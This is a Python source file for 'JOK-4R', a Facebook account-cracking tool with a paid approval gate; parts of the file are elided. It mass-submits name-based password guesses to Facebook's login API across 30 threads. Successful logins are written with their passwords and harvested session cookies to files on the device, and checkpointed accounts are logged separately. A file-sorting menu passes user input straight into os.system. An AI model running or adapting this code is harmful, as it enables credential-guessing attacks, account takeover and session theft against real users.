...
from concurrent.futures import ThreadPoolExecutor as sarfrazJOKAR
from string import * 
...
model2 = requests.get('https://github.com/Jok4rsoj1b4/PAID-OKS/blob/main/Aprob.txt').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
...
sys.stdout.write('\x1b]2; JOK-4R\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;35m /$$  \ $$| $$       /$$/\  $$   
\033[1;38m|  $$$$$$/| $$$$$$$$| $$  \ $$     
\033[1;38m \______/ |________/|__/  |__/         JOKAR                                                                                                                                                                
\033[1;37m----------------------------------------------
\033[1;37m    [-] AUTHOR    :\033[1;32m JOK4R/-SOJ1B
\033[1;37m    [-] GITHUB    :\033[1;32m MR JOK4R
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back JOK-4R Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JOK-4R] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JOKAR = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JOKARb};{ckkk}"
                    print(f"\r{R} [JOK-4R-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/JOK-4R_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JOK-4R_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [JOK-4R-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/JOK-4R_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JOK-4R] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JOKARb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JOKARb};{ckkk}"
                    print(f"\r{R} [JOK-4R-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/JOK-4R_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JOK-4R_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [JOK-4R-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[JOK-4R] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JOKAR = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JOKAR};{ckkk}"
                    print(f"\r{R} [JOK-4R-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/JOK-4R_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JOK-4R_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[JOK-4R] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [JOK-4R-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/JOK-4R_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazJOKAR(max_workers=30) as JOKARworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                JOKARworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                JOKARworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                JOKARworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                JOKARworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/JOK-4R.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/JOK-4R.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    JOKAR = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+JOKAR+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + JOKAR )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back JOK-4R Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/JOK-4R.txt\n') 
        filepath = input("Put File Name: ")
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/JOKARsoj1b4/PAID-OKS/blob/main/Aprob.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/qr/4TENEWTXF3ZOB1?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
